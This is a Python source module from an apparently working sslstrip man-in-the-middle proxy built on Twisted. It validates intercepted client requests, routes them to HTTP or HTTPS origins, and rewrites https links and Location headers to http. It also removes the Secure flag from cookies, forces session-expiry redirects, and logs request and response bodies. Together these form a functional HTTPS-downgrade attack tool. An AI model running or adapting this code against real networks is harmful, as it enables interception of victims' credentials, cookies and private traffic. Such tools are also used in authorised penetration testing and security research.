"""Validate client requests and orchestrate upstream fetch plus rewriting."""

import logging
from collections.abc import Iterator, Sequence
from dataclasses import dataclass

from twisted.internet.defer import Deferred

from sslstrip.app import App
from sslstrip.compression import decode_body, encode_body, parse_encodings
from sslstrip.cookies import strip_secure_flag
from sslstrip.errors import ProxyClientError, map_upstream_failure
from sslstrip.headers import (
    drop_headers,
    filter_request_headers,
    filter_response_headers,
    first_header,
    header_values,
    replace_header,
)
from sslstrip.links import SecureLinkStore
from sslstrip.rewrite import (
    decode_text,
    discover_relative_links,
    encode_text,
    is_rewritable,
    rewrite_https_references,
    rewrite_location,
)
from sslstrip.twisted_types import ClientRequestLike
from sslstrip.upstream import ResponseBody, UpstreamResponse
from sslstrip.urls import InvalidAuthorityError, request_http_url, upstream_url

logger = logging.getLogger('sslstrip')

SUPPORTED_PROTOCOLS = {b'HTTP/1.0', b'HTTP/1.1'}
ACCEPTED_ENCODINGS = 'gzip, br, zstd'
NO_BODY_CODES = frozenset({204, 304})


@dataclass(frozen=True, slots=True)
class ValidatedRequest:
    """Client request after protocol and Host validation."""

    method: str
    host_header: str
    hostname: str
    header_port: int | None
    path: str
    http_url: str
    client: str
    headers: list[tuple[str, str]]
    body: bytes
    cookie_header: str | None


@dataclass(frozen=True, slots=True)
class UpstreamTarget:
    """Where the Agent should fetch this request."""

    secure: bool
    hostname: str
    port: int
    url: str


@dataclass(frozen=True, slots=True)
class PreparedResponse:
    """Headers and body ready to write to the client."""

    code: int
    phrase: bytes
    headers: list[tuple[str, str]]
    body: bytes | ResponseBody


async def handle_request(request: ClientRequestLike, app: App) -> None:
    """Process one client request and write a complete response."""
    try:
        await _handle(request, app)
    except ProxyClientError as exc:
        _send_error(request, exc.code, exc.detail)
    except Exception as exc:
        logger.warning('Upstream failure: %s', exc, exc_info=True)
        code = map_upstream_failure(exc)
        _send_error(request, code, _detail_for_status(code))


async def _handle(request: ClientRequestLike, app: App) -> None:
    validated = validate_request(request)
    if app.sessions.should_expire(validated.method, validated.client, validated.host_header, validated.cookie_header):
        expire = app.sessions.expire_headers(
            validated.client, validated.host_header, validated.path, validated.cookie_header or ''
        )
        _send_expire_redirect(request, validated.host_header, validated.path, expire)
        return
    target = route(validated, app.links)
    forwarded = _outbound_headers(validated.headers, target)
    if app.traffic.enabled_for(method=validated.method, secure=target.secure):
        app.traffic.write(
            direction='request',
            method=validated.method,
            url=target.url,
            secure=target.secure,
            headers=forwarded,
            body=validated.body,
        )
    upstream = await app.fetch(
        method=validated.method.encode('ascii'),
        url=target.url,
        headers=forwarded,
        body=validated.body,
        timeout=app.config.response_timeout,
        max_body_size=app.config.max_body_size,
    )
    try:
        prepared = transform_response(
            upstream,
            target,
            client=validated.client,
            store=app.links,
            max_body_size=app.config.max_body_size,
            method=validated.method,
        )
        if app.traffic.enabled_for(method=validated.method, secure=target.secure):
            app.traffic.write(
                direction='response',
                method=validated.method,
                url=target.url,
                secure=target.secure,
                headers=prepared.headers,
                body=prepared.body,
            )
        await write_response(request, validated.method, prepared)
    finally:
        if isinstance(upstream.body, ResponseBody):
            upstream.body.close()


def validate_request(request: ClientRequestLike) -> ValidatedRequest:
    """Reject unsupported methods/versions and parse the request-target."""
    method = request.method.decode('latin-1').upper()
    if request.clientproto not in SUPPORTED_PROTOCOLS:
        raise ProxyClientError(426, 'Upgrade Required')
    if method == 'CONNECT':
        raise ProxyClientError(405, 'Method Not Allowed')
    raw_headers = _raw_headers(request.requestHeaders.getAllRawHeaders())
    if _is_upgrade(raw_headers):
        raise ProxyClientError(426, 'Upgrade Required')
    host_header = request.getHeader('host')
    if host_header is None or host_header.strip() == '':
        raise ProxyClientError(400, 'Bad Request')
    try:
        http_url, hostname, header_port, path = request_http_url(host_header, request.uri)
    except InvalidAuthorityError as exc:
        raise ProxyClientError(400, 'Bad Request') from exc
    return ValidatedRequest(
        method=method,
        host_header=host_header,
        hostname=hostname,
        header_port=header_port,
        path=path,
        http_url=http_url,
        client=request.getClientIP() or 'unknown',
        headers=raw_headers,
        body=_read_content(request),
        cookie_header=request.getHeader('cookie'),
    )


def route(validated: ValidatedRequest, store: SecureLinkStore) -> UpstreamTarget:
    """Choose HTTP vs HTTPS origin from the secure-link store."""
    secure_port = store.get(validated.client, validated.http_url)
    if secure_port is not None:
        port = secure_port
        secure = True
    else:
        port = validated.header_port if validated.header_port is not None else 80
        secure = False
    url = upstream_url(secure=secure, hostname=validated.hostname, port=port, path=validated.path)
    return UpstreamTarget(secure=secure, hostname=validated.hostname, port=port, url=url)


def transform_response(
    upstream: UpstreamResponse,
    target: UpstreamTarget,
    *,
    client: str,
    store: SecureLinkStore,
    max_body_size: int,
    method: str,
) -> PreparedResponse:
    """Rewrite Location/body/cookies; keep the original body when text is unchanged."""
    headers = list(upstream.headers)
    location = first_header(headers, 'location')
    if location is not None:
        https_base = target.url if target.secure else None
        headers = replace_header(headers, 'Location', rewrite_location(location, client, store, https_base=https_base))
    if target.secure:
        cookies = header_values(headers, 'set-cookie')
        if cookies:
            headers = drop_headers(headers, ['set-cookie'])
            headers.extend(('Set-Cookie', strip_secure_flag(cookie)) for cookie in cookies)
    content_type = first_header(headers, 'content-type')
    encodings = parse_encodings(first_header(headers, 'content-encoding'))
    payload: bytes | ResponseBody = upstream.body
    body_changed = False
    if is_rewritable(content_type):
        buffered = _buffer_for_rewrite(payload, max_body_size)
        if buffered is None:
            logger.warning('Passing %s response through unchanged (oversized)', target.url)
        else:
            decoded = decode_body(buffered, encodings, max_body_size)
            if decoded.decoded:
                text, charset = decode_text(decoded.data, content_type)
                rewritten = rewrite_https_references(text, client, store)
                if target.secure and content_type is not None:
                    discover_relative_links(
                        text,
                        content_type=content_type,
                        https_base=target.url,
                        client=client,
                        store=store,
                    )
                if rewritten != text:
                    payload = encode_body(encode_text(rewritten, charset), list(decoded.encodings))
                    body_changed = True
            else:
                logger.warning('Passing %s response through unchanged (%s)', target.url, decoded.passthrough_reason)
    headers = filter_response_headers(headers, body_changed=body_changed)
    if body_changed:
        headers = replace_header(headers, 'Content-Length', str(_body_size(payload)))
        if encodings:
            headers = replace_header(headers, 'Content-Encoding', ', '.join(encodings))
    elif first_header(headers, 'content-length') is None and _allows_message_body(upstream.code, method):
        headers = replace_header(headers, 'Content-Length', str(_body_size(payload)))
    return PreparedResponse(code=upstream.code, phrase=upstream.phrase, headers=headers, body=payload)


async def write_response(request: ClientRequestLike, method: str, prepared: PreparedResponse) -> None:
    """Write status, headers, and body to the client."""
    request.setResponseCode(prepared.code, prepared.phrase)
    _write_headers(request, prepared.headers)
    if method == 'HEAD':
        request.finish()
        return
    if isinstance(prepared.body, bytes):
        request.write(prepared.body)
        request.finish()
        return
    producer = _ResponseBodyProducer(request, prepared.body)
    request.registerProducer(producer, False)
    await producer.finished


class _ResponseBodyProducer:
    def __init__(self, request: ClientRequestLike, body: ResponseBody) -> None:
        self._request = request
        self._chunks = iter(body)
        self.finished: Deferred[None] = Deferred()

    def resumeProducing(self) -> None:
        try:
            chunk = next(self._chunks)
        except StopIteration:
            self._request.unregisterProducer()
            self._request.finish()
            if not self.finished.called:
                self.finished.callback(None)
        except Exception:
            self._request.unregisterProducer()
            if not self.finished.called:
                self.finished.errback()
        else:
            self._request.write(chunk)

    def pauseProducing(self) -> None:
        return None

    def stopProducing(self) -> None:
        if not self.finished.called:
            self.finished.callback(None)


def _buffer_for_rewrite(body: bytes | ResponseBody, max_body_size: int) -> bytes | None:
    if isinstance(body, bytes):
        return body
    if body.size > max_body_size:
        return None
    return body.read()


def _body_size(body: bytes | ResponseBody) -> int:
    return len(body) if isinstance(body, bytes) else body.size


def _allows_message_body(code: int, method: str) -> bool:
    """Whether the response may carry a message body (RFC 9110 §6.4.1)."""
    return method != 'HEAD' and not 100 <= code < 200 and code not in NO_BODY_CODES


def _outbound_headers(raw_headers: list[tuple[str, str]], target: UpstreamTarget) -> list[tuple[str, str]]:
    forwarded = filter_request_headers(raw_headers)
    default_port = 443 if target.secure else 80
    hostname = f'[{target.hostname}]' if ':' in target.hostname else target.hostname
    host_value = hostname if target.port == default_port else f'{hostname}:{target.port}'
    forwarded.append(('Host', host_value))
    forwarded.append(('Accept-Encoding', ACCEPTED_ENCODINGS))
    return forwarded


def _raw_headers(raw: Iterator[tuple[bytes, Sequence[bytes]]]) -> list[tuple[str, str]]:
    pairs: list[tuple[str, str]] = []
    for name, values in raw:
        decoded_name = name.decode('latin-1')
        for value in values:
            pairs.append((decoded_name, value.decode('latin-1')))
    return pairs


def _is_upgrade(headers: Sequence[tuple[str, str]]) -> bool:
    for name, value in headers:
        lowered = name.lower()
        if lowered == 'upgrade' and value.strip():
            return True
        if lowered == 'connection' and 'upgrade' in value.lower():
            return True
    return False


def _read_content(request: ClientRequestLike) -> bytes:
    content = request.content
    if content is None:
        return b''
    content.seek(0)
    return content.read()


def _write_headers(request: ClientRequestLike, headers: Sequence[tuple[str, str]]) -> None:
    request.responseHeaders.removeHeader(b'content-type')
    seen: set[str] = set()
    for name, value in headers:
        key = name.lower()
        if key == 'set-cookie' or key in seen:
            request.responseHeaders.addRawHeader(name, value)
        else:
            request.setHeader(name, value)
        seen.add(key)


def _send_expire_redirect(request: ClientRequestLike, host: str, path: str, cookies: list[str]) -> None:
    request.setResponseCode(302, b'Found')
    request.setHeader(b'Connection', b'close')
    request.setHeader(b'Location', f'http://{host}{path}')
    for cookie in cookies:
        request.responseHeaders.addRawHeader(b'Set-Cookie', cookie)
    request.finish()


def _send_error(request: ClientRequestLike, code: int, detail: str) -> None:
    try:
        request.setResponseCode(code)
        request.setHeader(b'Content-Type', b'text/plain; charset=utf-8')
        body = detail.encode('ascii', errors='replace')
        request.setHeader(b'Content-Length', str(len(body)))
        request.write(body)
        request.finish()
    except Exception:
        logger.debug('Failed to send error response %s', code, exc_info=True)


def _detail_for_status(code: int) -> str:
    if code == 504:
        return 'Gateway Timeout'
    return 'Bad Gateway'
